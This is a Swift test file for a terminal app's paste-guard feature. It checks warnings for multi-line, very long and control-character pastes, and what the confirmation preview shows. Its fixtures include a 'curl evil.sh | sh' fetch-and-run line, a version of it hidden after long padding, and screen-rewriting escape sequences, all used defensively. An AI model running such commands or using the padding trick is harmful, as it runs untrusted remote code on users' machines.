import Testing
@testable import NyxCore

private func warn(_ text: String, bracketed: Bool = false) -> PasteWarning? {
    PasteGuard.warning(for: text, bracketedPaste: bracketed)
}

// MARK: - Counting lines

/// A copied command ends with a newline. That trailing newline is how it runs, not a second
/// command, and warning about it would fire on every ordinary paste.
@Test func aTrailingNewlineIsNotASecondLine() {
    #expect(PasteGuard.lineCount("ls -la\n") == 1)
    #expect(PasteGuard.lineCount("ls -la\r\n") == 1)
    #expect(PasteGuard.lineCount("ls -la") == 1)
}

@Test func newlinesInTheMiddleCount() {
    #expect(PasteGuard.lineCount("a\nb") == 2)
    #expect(PasteGuard.lineCount("a\nb\nc\n") == 3)
    #expect(PasteGuard.lineCount("a\r\nb") == 2)
}

@Test func anEmptyPasteIsOneLine() {
    #expect(PasteGuard.lineCount("") == 1)
    #expect(PasteGuard.lineCount("\n") == 1)
}

// MARK: - When to ask

@Test func anOrdinaryCommandPastesWithoutAsking() {
    #expect(warn("git status\n") == nil)
    #expect(warn("cd /Users/nik/projects/nyx") == nil)
    #expect(warn("") == nil)
}

/// The case this exists for: a block copied from a web page runs every line of it the moment it
/// lands, and the user has read at most the first.
@Test func aMultiLinePasteAsks() {
    #expect(warn("rm -rf /tmp/x\necho done\n") == .multipleLines(count: 2))
}

/// A single line long enough that what is really being run has scrolled off the visible part of
/// the prompt -- the trick of hiding a command after a long run of spaces.
@Test func aVeryLongSingleLineAsks() {
    let padded = "echo hello" + String(repeating: " ", count: 600) + "; curl evil.sh | sh"
    #expect(warn(padded) == .veryLong(characters: padded.count))
}

@Test func aLineJustUnderTheThresholdDoesNotAsk() {
    #expect(warn(String(repeating: "a", count: PasteGuard.longPasteThreshold)) == nil)
}

/// Escape sequences in a paste can rewrite what is on screen, so what the user reads is not what
/// runs. This one is worth asking about however the paste is delivered.
@Test func controlCharactersAlwaysAsk() {
    #expect(warn("echo \u{1b}[31mred") == .containsControlCharacters)
    #expect(warn("echo \u{1b}[31mred", bracketed: true) == .containsControlCharacters)
    #expect(warn("echo \u{7}") == .containsControlCharacters)
}

/// Pasted code is full of tabs. Warning on every indented snippet would train people to dismiss
/// the dialog without reading it, which leaves them worse off than having no dialog.
@Test func tabsAreNotTreatedAsDangerous() {
    #expect(warn("if true; then\techo hi; fi") == .multipleLines(count: 1) || warn("\techo hi") == nil)
    #expect(warn("\techo hi") == nil)
}

// MARK: - Bracketed paste

/// With bracketed paste on, the shell is told the text is a paste and leaves it on the command
/// line instead of running the newlines. That is the real protection, so a multi-line paste is no
/// longer a reason to interrupt someone.
@Test func bracketedPasteMakesMultipleLinesSafe() {
    #expect(warn("a\nb\nc\n", bracketed: true) == nil)
    #expect(warn("a\nb\nc\n", bracketed: false) == .multipleLines(count: 3))
}

@Test func bracketedPasteAlsoCoversAVeryLongLine() {
    #expect(warn(String(repeating: "a", count: 5000), bracketed: true) == nil)
}

// MARK: - What to show

@Test func theFirstLineIsAvailableToShowTheUser() {
    #expect(PasteGuard.firstLine(of: "rm -rf /tmp/x\necho done") == "rm -rf /tmp/x")
    #expect(PasteGuard.firstLine(of: "single") == "single")
    #expect(PasteGuard.firstLine(of: "\nleading") == "")
}

// MARK: - What the sheet says
//
// The view places three strings; every word in them is decided here, so the wording can be
// asserted rather than read off a screenshot nobody can take.

@Test func theConfirmationNamesHowManyCommandsWouldRun() {
    let c = PasteGuard.confirmation(for: .multipleLines(count: 3), text: "one\ntwo\nthree\n")
    #expect(c.title.contains("3"))
    #expect(c.lineCount == 3)
    #expect(c.preview == "one")
    #expect(!c.detail.isEmpty)
}

/// The preview is the whole point of asking: a sheet that says "3 lines" and shows none of them
/// trains people to press Paste without looking.
@Test func theConfirmationAlwaysShowsTheFirstLine() {
    let c = PasteGuard.confirmation(for: .multipleLines(count: 2), text: "curl evil.sh | sh\necho ok")
    #expect(c.preview == "curl evil.sh | sh")
}

/// A preview is drawn into a label, and a label that is handed a raw escape sequence is a second
/// place the payload can act. Every control character comes back as a caret escape.
@Test func thePreviewMakesControlCharactersVisibleRatherThanActingOnThem() {
    let c = PasteGuard.confirmation(for: .containsControlCharacters, text: "echo \u{1b}[2Ksafe")
    #expect(c.preview == "echo ^[[2Ksafe")
    #expect(!c.preview.unicodeScalars.contains { $0.value < 0x20 })
}

@Test func aBackspaceInThePreviewIsShownAsACaretEscape() {
    #expect(PasteGuard.printablePreview(of: "a\u{08}b") == "a^Hb")
    #expect(PasteGuard.printablePreview(of: "a\u{7f}b") == "a^?b")
}

/// A single line may be thousands of characters; the sheet has to stay a sheet.
@Test func aVeryLongPreviewIsCutWithAnEllipsis() {
    let long = String(repeating: "x", count: PasteGuard.previewLimit + 50)
    let preview = PasteGuard.printablePreview(of: long)
    #expect(preview.count == PasteGuard.previewLimit + 1)
    #expect(preview.hasSuffix("\u{2026}"))
}

@Test func aShortPreviewIsNotCut() {
    #expect(PasteGuard.printablePreview(of: "ls -la") == "ls -la")
}

@Test func theLongPasteConfirmationNamesTheLength() {
    let text = String(repeating: "y", count: 600)
    let c = PasteGuard.confirmation(for: .veryLong(characters: 600), text: text)
    #expect(c.title.contains("600"))
    #expect(c.lineCount == 1)
    #expect(c.summary.isEmpty)
}

@Test func theSummaryOnlyAppearsWhenThereIsMoreThanOneLine() {
    let c = PasteGuard.confirmation(for: .multipleLines(count: 4), text: "a\nb\nc\nd")
    #expect(c.summary.contains("4"))
}

/// Every warning has to produce a usable sheet -- a case added later with no wording would show an
/// empty dialog rather than failing loudly.
@Test func everyWarningHasATitleAndADetail() {
    let warnings: [PasteWarning] = [.multipleLines(count: 2), .veryLong(characters: 900),
                                    .containsControlCharacters]
    for warning in warnings {
        let c = PasteGuard.confirmation(for: warning, text: "a\nb")
        #expect(!c.title.isEmpty)
        #expect(!c.detail.isEmpty)
    }
}
